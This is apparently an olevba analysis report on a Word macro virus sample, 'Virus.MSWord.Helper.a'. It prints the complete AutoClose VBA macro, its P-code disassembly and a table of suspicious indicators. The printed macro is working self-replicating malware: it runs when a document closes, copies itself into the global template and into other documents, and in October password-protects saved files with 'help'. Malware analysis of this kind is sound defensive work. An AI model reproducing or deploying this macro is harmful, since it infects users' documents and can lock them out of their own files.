olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Helper.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Helper.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Helper.a - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim infected
Dim cycle
Dim name_$
WordBasic.DisableInput 1
If Mid(WordBasic.[Date$](), 4, 2) = "10" Then
    WordBasic.ToolsOptionsSave Password:="help"
End If

total = WordBasic.CountMacros(0)
infected = 0

If total > 0 Then
    For cycle = 1 To total
        If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
            infected = 1
        End If
    Next cycle
End If

name_$ = WordBasic.[WindowName$]() + ":AutoClose"

If infected <> 1 Then
    WordBasic.MacroCopy name_$, "Global:AutoClose", 1
Else
    infected = 0
End If

If WordBasic.CountMacros(1) <> 0 Then
        infected = 1
End If

If infected = 0 Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy "Global:AutoClose", name_$
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Helper.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 2268 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn total
' Line #3:
' 	Dim 
' 	VarDefn infected
' Line #4:
' 	Dim 
' 	VarDefn cycle
' Line #5:
' 	Dim 
' 	VarDefn name_
' Line #6:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [Date$] 0x0000 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0004 "help"
' 	ParamNamed Password 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #9:
' 	EndIfBlock 
' Line #10:
' Line #11:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St total 
' Line #12:
' 	LitDI2 0x0000 
' 	St infected 
' Line #13:
' Line #14:
' 	Ld total 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld cycle 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld total 
' 	For 
' Line #16:
' 	Ld cycle 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	St infected 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld cycle 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	EndIfBlock 
' Line #21:
' Line #22:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St name_$ 
' Line #23:
' Line #24:
' 	Ld infected 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	Ld name_$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	LitDI2 0x0000 
' 	St infected 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #31:
' 	LitDI2 0x0001 
' 	St infected 
' Line #32:
' 	EndIfBlock 
' Line #33:
' Line #34:
' 	Ld infected 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #36:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld name_$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

